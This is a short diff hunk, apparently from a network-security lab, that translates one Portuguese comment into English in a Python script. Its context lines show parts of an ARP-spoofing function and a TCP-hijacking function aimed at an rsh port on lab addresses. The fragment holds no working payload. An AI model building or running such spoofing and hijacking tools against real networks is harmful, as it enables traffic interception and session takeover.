@@ -46,7 +46,7 @@ def arp_spoof(target_ip, target_mac, spoof_ip, attacker_mac):
         print("[***] ARP spoofing stopped.")
         exit(0)
 
-# Função to start TCP connection
+# Function to start TCP connection
 def tcp_hijack(server_ip="10.9.0.6", terminal_ip="10.9.0.5", src_port=1023, dst_port=514, sequence=1000):    
     # 1. Send SYN packet
     print("[*] Sending SYN packet:")
